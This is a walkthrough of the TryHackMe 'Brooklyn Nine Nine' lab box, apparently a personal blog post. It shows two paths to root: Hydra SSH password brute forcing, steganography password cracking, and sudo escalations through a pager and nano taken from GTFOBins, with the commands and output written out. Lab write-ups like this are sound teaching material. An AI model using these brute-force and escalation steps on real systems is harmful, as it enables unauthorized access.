---
layout: post
title: Writeup - THM - Brooklyn-NineNine
description: "Walkthrough of Brooklyn NineNine of TryHackme"
tags: [TryHackeMe, Brooklyn-NineNine, Hacking, pwned]
author: Fr3akazo1d!
---

# General Information

| Room        | Date        | Difficulty | Tags                                   | Time     |
| ----------- | ----------- | ---------- | -------------------------------------- | -------- |
| Brooklyn NineNine      | 06.10.2020  | easy       | security, nmap, gobuster, pentest | -- |


# Used Programs

| Program  | Command |
| --------- | -------- |
| namp     | nmap -sC -sV -oN nmap/initial $ip -Pn|
| ftp | ftp $ip |
| hydra | hydra -t 16 -l j*** -P /usr/share/wordlists/rockyou.txt 10.10.93.39 ssh | 
| ssh | ssh j***@10.10.93.39 |
| stegcracker | s********* brooklyn99.jpg /usr/share/wordlists/rockyou.txt | 

# open ports

| Port | Service     | Version             |
| ---- | ----------- | ------------------- |
| 21   | ftp  | vsftpd 3.0.3        |
| 22   | ssh         | OpenSSH 7.6p1       |
| 80   | http | Apache httpd 2.4.29 |

On this room, there where 2 Ways to get to the root flag. 
So i decided to check if i found both ways into the target. 

## Walkthrough


### First Way

First we are starting with the namp Scan on the target. 
Beside this, i was running a gobuster scan, but there was nothing interessting on the results. 

### nmap Scan
```sh
bat nmap/initial    
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: nmap/initial
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.80 scan initiated Mon Oct  5 20:18:55 2020 as: nmap -sC -sV -oN nmap/initial 10.10.93.39
   2   │ Nmap scan report for 10.10.93.39
   3   │ Host is up (0.075s latency).
   4   │ Not shown: 997 closed ports
   5   │ PORT   STATE SERVICE VERSION
   6   │ 21/tcp open  ftp     vsftpd 3.0.3
   7   │ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
   8   │ |_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
   9   │ | ftp-syst: 
  10   │ |   STAT: 
  11   │ | FTP server status:
  12   │ |      Connected to ::ffff:10.11.3.139
  13   │ |      Logged in as ftp
  14   │ |      TYPE: ASCII
  15   │ |      No session bandwidth limit
  16   │ |      Session timeout in seconds is 300
  17   │ |      Control connection is plain text
  18   │ |      Data connections will be plain text
  19   │ |      At session startup, client count was 1
  20   │ |      vsFTPd 3.0.3 - secure, fast, stable
  21   │ |_End of status
  22   │ 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  23   │ | ssh-hostkey: 
  24   │ |   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
  25   │ |   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
  26   │ |_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
  27   │ 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  28   │ |_http-server-header: Apache/2.4.29 (Ubuntu)
  29   │ |_http-title: Site doesn't have a title (text/html).
  30   │ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  31   │ 
  32   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  33   │ # Nmap done at Mon Oct  5 20:19:07 2020 -- 1 IP address (1 host up) scanned in 12.41 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

### FTP-Enumeration 

It Looks Anonymous login is available on the FTP-Server. So this is my first way to check the FTP-Server. 

```
ftp 10.10.93.39 
Connected to 10.10.93.39.
220 (vsFTPd 3.0.3)
Name (10.10.93.39:fr3akazo1d): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (332.9826 kB/s)
ftp>
````
On the FTP-Server there is a file witch i downloaded. 
After downloading the File, we can check was is in it. 

```sh 
bat note_to_j***.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: note_to_jake.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ From A**,
   2   │ 
   3   │ J*** please change your password. It is too weak and h*** will be mad if someone hacks into the nine nine
   4   │ 
   5   │ 
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

As in the note mentioned, J*** has a week password. So we can try it to Brue-Froce the password with Hydra. 

### Hydra-BruteForce

```sh
hydra -t 16 -l j*** -P /usr/share/wordlists/rockyou.txt 10.10.93.39 ssh                                    
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-05 21:04:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.93.39:22/
[22][ssh] host: 10.10.93.39   login: jake   password: 9*******1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-05 21:05
```

After a few seconds we got a password for J***

Password: 9*******1

### ssh login

Now we have the Username and the Password. We can now login into the Target with this credentials. 

```sh
ssh j***@10.10.93.39
```

After login, on this user, there is no User-flag located. So i tried to check other user directorys. But i don't have any permission to do that. 

So i decided to go for root and check then the other directorys. 

First i checked the sudo -l command. And yes we can run a command with sudo rights. 

```sh 
j***@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/l***
```

### Priv-Escalation 

Now lets have a look at GTFO-Bins. If we can escalate the privilage with that application. 
GTFOBins:

```sh
sudo l*** /etc/profile
!/bin/sh
```

Now i have root privilage and we can check for the flags. 

proof that iam root.

```sh
root@brookly_nine_nine:~# whoami
root
```
Now first check for the user-flag, found three user on the target:

```sh
root@brookly_nine_nine:/home# ls
a**  h***  j***
```sh

So i decided to look into the folder for the user flag. Found user flag in User H***

```sh
root@brookly_nine_nine:/home/***# ls
nano.save  user.txt
root@brookly_nine_nine:/home/***# cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
e******************************e
```

We have found the user flag lets get the root flag:

```sh
root@brookly_nine_nine:/root# ls
root.txt
root@brookly_nine_nine:/root# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine


Enjoy!!
```

No we got the root flag. 

## Second Way

For the second way i was checking the Webserver. If i found some interessting stuff on it. 

The Webpage is only a Picture of "Brooklyn-Nine-Nine". so i decided to have a look into the Source-Code. 

Found a note under the picture. 

### Web-Server Enumeration

```sh
<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
``` 

I download the picture and check with stegehide if there is some hidden information stored.

```sh
steghide extract -sf brooklyn99.jpg
Enter passphrase:
```

For the extraction of the file i need a password. So i decided to go for a brute force attack on the password. 

After a little research i found a github project whitch is for brute-forcing a stegehide hidden note.

### Brute-Forceing the Picture

```sh
s********* brooklyn99.jpg /usr/share/wordlists/rockyou.txt
S********* 2.0.9 - (https://github.com/Paradoxis/S**********)
Copyright (c) 2020 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20459 passwords
Your file has been written to: brooklyn99.jpg.out
admin
```

The tool itself extract the file automatically. 

But i tried the password with stegehide. 

```sh
steghide extract -sf brooklyn99.jpg                        
Enter passphrase: 
wrote extracted data to "note.txt".
```

A note.txt file is extracted from the picture. Lets see what is in that file. 

```sh
bat note.txt           
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: note.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ H**** Password:
   2   │ f******************e
   3   │ 
   4   │ Enjoy!!
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Now we have a Username and a password, so lets login in the the user. 

### ssh login

```sh 
ssh h***@10.10.93.39               
h***@10.10.93.39's password: 
Last login: Mon Oct  5 18:45:59 2020 from 10.11.3.139
h***@brookly_nine_nine:~$
```

We get access to the target. cat the user-flag witch is located under the logged in user.

```sh
holt@brookly_nine_nine:~$ cat user.txt
e******************************e
```

Lets get the root flag.

tried the commadn sudo-l and the user can run one command as sudo user:

```sh
h***t@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/n***
```

lets jump to GTFO-Bins to look if we can use nano for our priv-escalation

### Priv-Escalation 

Found a way on GTFO-Bins for my Priv-Escalation. 

```sh
sudo bin/n***
^R^X
reset; sh 1>&0 2>&0
```

So I execudet the application and run the commands witch GFTO-Bins recommend. 

```sh
Command to execute: reset; sh 1>&0 2>&0# id
```

Now we have root access on the target. 

```sh 
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
#
``` 

We can now read the root-flag under /root.

```sh
cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 6******************************5
Enjoy!!
```

## Summary

The Box was easy and there was no new stuff in it. It was pretty forward. But i was nice and i had to check my learning on this box. 
